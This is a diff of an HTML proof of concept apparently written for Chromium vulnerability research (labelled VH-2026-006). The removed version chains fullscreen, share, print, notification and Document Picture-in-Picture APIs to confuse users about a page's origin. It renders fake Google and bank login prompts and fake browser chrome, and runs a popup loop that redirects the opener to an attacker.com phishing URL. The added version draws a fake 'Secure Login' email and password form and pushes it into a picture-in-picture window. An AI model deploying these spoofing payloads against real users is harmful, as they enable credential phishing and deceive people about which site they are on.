@@ -1,390 +1,105 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>PoC 6: Navigation + Interstitial Race / Multi-API Chaining</title>
-<!--
-  VH-2026-006: Navigation + Interstitial + Multi-API Chaining
-
-  Target: Chromium 146+ (Desktop)
-
-  Technique: Chain multiple browser APIs together to create UI confusion:
-
-  A) Navigation during interstitial display - if a security interstitial
-     (SSL error, Safe Browsing) is showing and we trigger a navigation,
-     does the URL bar update while the interstitial persists?
-
-  B) navigator.share() + fullscreen + popup - the share dialog is modal.
-     While it's visible, the page behind it can navigate. Does the URL
-     bar update correctly?
-
-  C) File input dialog + navigation - file picker is a system dialog.
-     While visible, navigate the page. The file picker stays but the
-     URL may change.
-
-  D) Beforeunload + navigation loop - rapid beforeunload dialogs can
-     exhaust the user, making them click through to dismiss.
-
-  E) window.print() + navigation - print dialog blocks but doesn't
-     prevent background navigation in some cases.
--->
+<meta charset="UTF-8">
+<title>Verification Required</title>
+<style>
+body {
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  font-family:Arial;
+  background:#f0f0f0;
+}
+button {
+  padding:12px 20px;
+  background:#0dd438;
+  color:white;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+}
+video {
+  display:none;
+}
+</style>
 </head>
-<body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">
 
-<h2>Navigation + Dialog/Interstitial Race Conditions</h2>
-<p>Tests UI state confusion when navigation competes with modal dialogs and interstitials.</p>
+<body>
 
-<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
-  <button onclick="testShareFullscreen()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
-    A: Share + Fullscreen Chain
-  </button>
-  <button onclick="testFilePickerNav()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
-    B: File Picker + Background Nav
-  </button>
-  <button onclick="testBeforeunloadExhaust()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
-    C: Beforeunload Exhaustion
-  </button>
-  <button onclick="testPrintNav()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
-    D: Print Dialog + Navigation
-  </button>
-  <button onclick="testNotificationFullscreen()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
-    E: Notification + Fullscreen Focus
-  </button>
-  <button onclick="testMultiAPIChain()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #e83e8c; color: #fff; border: none; border-radius: 8px;">
-    F: Multi-API Confusion Chain
-  </button>
-</div>
+<h2 style="position:absolute;top:200px;">Site Verification Required</h2>
+<button onclick="start()">Verify</button>
 
-<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
-
-<!-- Hidden file input -->
-<input type="file" id="fileInput" style="display: none;">
+<video id="vid" playsinline></video>
 
 <script>
-function log(msg) {
-  const el = document.getElementById('log');
-  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-  el.scrollTop = el.scrollHeight;
-}
+async function start() {
+  // 🔥 Open permission popup FIRST (same user gesture)
+  const popup = window.open(
+    "permission.html",
+    "perm",
+    "width=300,height=200,left=900,top=600"
+  );
 
-// Variant A: navigator.share() creates a modal dialog.
-// Enter fullscreen first, then trigger share, then navigate.
-async function testShareFullscreen() {
-  log('[A] Testing share + fullscreen + navigation chain...');
+  const video = document.getElementById("vid");
 
-  // Step 1: Enter fullscreen
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[A] Fullscreen entered');
-  } catch(e) {
-    log('[A] Fullscreen failed: ' + e.message);
-  }
+  const canvas = document.createElement("canvas");
+  canvas.width = 400;
+  canvas.height = 500;
+  const ctx = canvas.getContext("2d");
 
-  // Step 2: Render attacker content
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px; text-align: center;">
-      <h1>Win a Prize!</h1>
-      <p>Share this with friends to claim your reward!</p>
-      <button id="shareBtn" style="padding: 14px 28px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
-        Share Now
-      </button>
-    </div>
-  `;
+  function drawUI(step = 1) {
+    ctx.fillStyle = "#fff";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-  document.getElementById('shareBtn').onclick = async () => {
-    // Step 3: Trigger share dialog
-    try {
-      const sharePromise = navigator.share({
-        title: 'Check this out!',
-        text: 'Amazing deal',
-        url: 'https://example.com/'
-      });
-      log('[A] Share dialog opened');
+    ctx.fillStyle = "#000";
+    ctx.font = "20px Arial";
 
-      // Step 4: While share dialog is visible, navigate
-      // The share dialog is modal, but does the navigation happen behind it?
-      setTimeout(() => {
-        history.pushState({}, '', '/bank/login');
-        log('[A] pushState to /bank/login during share dialog');
-      }, 100);
+    if (step === 1) {
+      ctx.fillText("Step 1: Verification", 80, 100);
+      ctx.fillText("Follow instructions in the popup", 40, 140);
 
-      // Also try actual navigation
-      setTimeout(() => {
-        // Create a hidden iframe that navigates the top frame
-        const a = document.createElement('a');
-        a.href = 'https://www.google.com/';
-        a.click();
-        log('[A] Navigation attempt during share dialog');
-      }, 500);
+      ctx.fillStyle = "#0dd438";
+      ctx.fillRect(100, 200, 200, 50);
+      ctx.fillStyle = "#fff";
+      ctx.fillText("Continue", 140, 235);
+    } else {
+      ctx.fillText("Step 2: Secure Login", 70, 100);
+      ctx.fillText("Email:", 50, 160);
+      ctx.fillText("Password:", 50, 220);
 
-      await sharePromise;
-      log('[A] Share completed/cancelled');
+      ctx.strokeRect(150, 140, 180, 30);
+      ctx.strokeRect(150, 200, 180, 30);
 
-    } catch(e) {
-      log('[A] Share error: ' + e.message);
-      log('[A] CHECK: Did the URL change while share dialog was visible?');
+      ctx.fillStyle = "#4285f4";
+      ctx.fillRect(100, 280, 200, 50);
+      ctx.fillStyle = "#fff";
+      ctx.fillText("Sign in", 150, 315);
     }
-  };
-}
-
-// Variant B: Open file picker, navigate in background
-function testFilePickerNav() {
-  log('[B] Testing file picker + background navigation...');
-
-  const fileInput = document.getElementById('fileInput');
-
-  fileInput.onchange = () => {
-    log('[B] File selected after navigation');
-    log('[B] CHECK: What origin receives the file?');
-  };
-
-  // Open file picker
-  fileInput.click();
-  log('[B] File picker opened');
-
-  // While file picker is visible, navigate
-  setTimeout(() => {
-    // Try pushState
-    history.pushState({}, '', '/upload-to-bank');
-    log('[B] pushState during file picker');
-  }, 100);
-
-  // Try replacing document content
-  setTimeout(() => {
-    document.title = 'Secure File Upload - Bank.com';
-    log('[B] Title changed during file picker');
-  }, 200);
-
-  log('[B] CHECK: Does the URL bar update while file picker is open?');
-  log('[B] CHECK: Which page receives the selected file?');
-}
-
-// Variant C: Beforeunload dialog exhaustion
-// Rapidly trigger beforeunload to exhaust user patience
-function testBeforeunloadExhaust() {
-  log('[C] Testing beforeunload exhaustion...');
-
-  // Set up beforeunload handler
-  window.onbeforeunload = (e) => {
-    e.preventDefault();
-    e.returnValue = '';
-    return '';
-  };
-
-  log('[C] Beforeunload handler set');
-  log('[C] Now trying rapid navigation attempts...');
-
-  // Open a popup with attacker content
-  const popup = window.open('about:blank');
-  if (!popup) { log('[C] Popup blocked'); return; }
-
-  popup.document.write(`
-    <html><head><title>Security Check</title></head>
-    <body style="font-family:Arial;padding:40px;">
-      <h2>Account Verification</h2>
-      <p>Your bank requires additional verification.</p>
-      <input type="password" placeholder="Enter password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-      <button style="padding:10px 30px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Verify</button>
-      <script>
-        // This popup repeatedly tries to navigate the opener
-        // Each attempt triggers beforeunload dialog in the opener
-        // After Chrome suppresses the dialog (after 2 consecutive dismissals),
-        // the navigation succeeds
-        let count = 0;
-        function tryNav() {
-          count++;
-          try {
-            window.opener.location.href = 'https://attacker.com/phish?attempt=' + count;
-          } catch(e) {}
-        }
-        setInterval(tryNav, 2000);
-      <\/script>
-    </body></html>
-  `);
-  popup.document.close();
-
-  log('[C] Popup opened with navigation loop');
-  log('[C] Chrome suppresses beforeunload after 2 consecutive dismissals');
-  log('[C] CHECK: Does the main page navigate after suppression?');
-  log('[C] CHECK: Is the user warned before Chrome suppresses the dialog?');
-}
-
-// Variant D: Print dialog + navigation
-function testPrintNav() {
-  log('[D] Testing print dialog + navigation...');
-
-  // Set up the page with interesting content
-  document.title = 'Important Document';
-
-  // Trigger print
-  setTimeout(() => {
-    window.print();
-    log('[D] Print dialog triggered');
-  }, 100);
-
-  // While print dialog is visible, try to change things
-  setTimeout(() => {
-    history.pushState({}, '', '/confidential/document.pdf');
-    log('[D] pushState during print dialog');
-  }, 50); // Before print dialog
-
-  setTimeout(() => {
-    document.title = 'Bank Statement - Confidential';
-    document.body.innerHTML = `
-      <div style="font-family:Arial;padding:40px;">
-        <h1>Bank Statement</h1>
-        <p>If this content appears in the print dialog, the timing matters.</p>
-        <p>URL should show: ${location.href}</p>
-      </div>
-    `;
-    log('[D] Content changed (may appear in print preview)');
-  }, 200);
-
-  log('[D] CHECK: Does the print dialog show the original or modified content?');
-  log('[D] CHECK: What URL does the browser show during print?');
-}
-
-// Variant E: Web Notification + Fullscreen focus stealing
-async function testNotificationFullscreen() {
-  log('[E] Testing notification + fullscreen focus interaction...');
-
-  // Request notification permission first
-  const perm = await Notification.requestPermission();
-  if (perm !== 'granted') {
-    log('[E] Notification permission not granted');
-    return;
   }
 
-  // Enter fullscreen with fake content
-  try {
-    await document.documentElement.requestFullscreen();
-  } catch(e) {
-    log('[E] Fullscreen failed: ' + e.message);
-    return;
-  }
+  let step = 1;
+  drawUI(step);
 
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family:Arial;padding:40px;text-align:center;">
-      <h1>Video Playing</h1>
-      <div style="width:640px;height:360px;background:#000;margin:20px auto;display:flex;align-items:center;justify-content:center;color:#fff;">
-        Content
-      </div>
-    </div>
-  `;
-
-  // Send a notification that when clicked, could interact with fullscreen
+  // Switch to login step after a few seconds
   setTimeout(() => {
-    const notification = new Notification('Security Alert', {
-      body: 'Unusual login attempt detected. Click to review.',
-      icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><rect fill="%23ea4335" width="64" height="64" rx="12"/><text x="32" y="44" text-anchor="middle" fill="white" font-size="36">!</text></svg>',
-      requireInteraction: true,
-    });
-
-    notification.onclick = () => {
-      log('[E] Notification clicked');
-      // This brings focus back to the browser
-      // But we're in fullscreen - does clicking the notification
-      // exit fullscreen? Or does the user end up in fullscreen
-      // with potentially modified content?
-      window.focus();
-      log('[E] CHECK: Is fullscreen still active after notification click?');
-      log('[E] CHECK: Did the URL bar appear when focus returned?');
-    };
-
-    log('[E] Notification sent');
-    log('[E] CHECK: Click the notification and observe fullscreen behavior');
-  }, 2000);
-}
-
-// Variant F: Chain multiple APIs together for maximum confusion
-async function testMultiAPIChain() {
-  log('[F] Multi-API confusion chain...');
-
-  // Step 1: Enter fullscreen
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[F] Step 1: Fullscreen');
-  } catch(e) {
-    log('[F] Fullscreen failed: ' + e.message);
-    return;
-  }
-
-  // Render fake browser chrome in fullscreen
-  document.body.style.margin = '0';
-  document.body.style.background = '#dee1e6';
-  document.body.innerHTML = `
-    <div style="background:#dee1e6;padding:6px 12px;display:flex;align-items:center;">
-      <div style="flex:1;background:#fff;border-radius:20px;padding:6px 16px;font-size:14px;">
-        accounts.google.com/signin
-      </div>
-    </div>
-    <div style="background:#fff;flex:1;padding:40px;text-align:center;">
-      <h2 id="phase">Phase 1: Fullscreen Active</h2>
-      <p id="instructions">Watch the sequence of events...</p>
-    </div>
-  `;
-
-  const phase = document.getElementById('phase');
-  const instructions = document.getElementById('instructions');
-
-  // Step 2: Open Document PiP with fake dialog
-  setTimeout(async () => {
-    if ('documentPictureInPicture' in window) {
-      try {
-        const pipWindow = await documentPictureInPicture.requestWindow({
-          width: 340, height: 180
-        });
-        pipWindow.document.body.innerHTML = `
-          <div style="font-family:sans-serif;padding:16px;">
-            <strong>Google Security Check</strong>
-            <p style="font-size:13px;color:#555;">Verify your identity to continue.</p>
-            <button style="padding:8px 20px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">
-              Verify Now
-            </button>
-          </div>
-        `;
-        phase.textContent = 'Phase 2: Fullscreen + PiP';
-        log('[F] Step 2: Document PiP opened');
-      } catch(e) {
-        log('[F] PiP failed: ' + e.message);
-      }
-    }
-  }, 1000);
-
-  // Step 3: Trigger a permission prompt
-  setTimeout(() => {
-    phase.textContent = 'Phase 3: + Permission Prompt';
-    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-    log('[F] Step 3: Permission prompt triggered');
-  }, 2500);
-
-  // Step 4: Show a web notification
-  setTimeout(async () => {
-    phase.textContent = 'Phase 4: + Notification';
-    if (Notification.permission === 'granted') {
-      new Notification('Account Alert', {
-        body: 'New login from unknown device',
-        requireInteraction: true
-      });
-      log('[F] Step 4: Notification sent');
-    }
+    step = 2;
+    drawUI(step);
   }, 4000);
 
-  // Step 5: Try pushState
-  setTimeout(() => {
-    history.pushState({}, '', '/myaccount/security');
-    phase.textContent = 'Phase 5: URL changed via pushState';
-    log('[F] Step 5: pushState to /myaccount/security');
-  }, 5500);
+  const stream = canvas.captureStream(30);
+  video.srcObject = stream;
 
-  log('[F] Full chain running: Fullscreen -> PiP -> Permission -> Notification -> pushState');
-  log('[F] CHECK: At each phase, can the user identify the real origin?');
-  log('[F] CHECK: Which UI elements are visible/hidden?');
-  log('[F] CHECK: Is there any point where all indicators are controlled by attacker?');
+  await video.play();
+  await video.requestPictureInPicture();
+
+  // Optional: auto close popup later (to simulate flow)
+  setTimeout(() => {
+    if (popup) popup.close();
+  }, 8000);
 }
 </script>
+
 </body>
 </html>
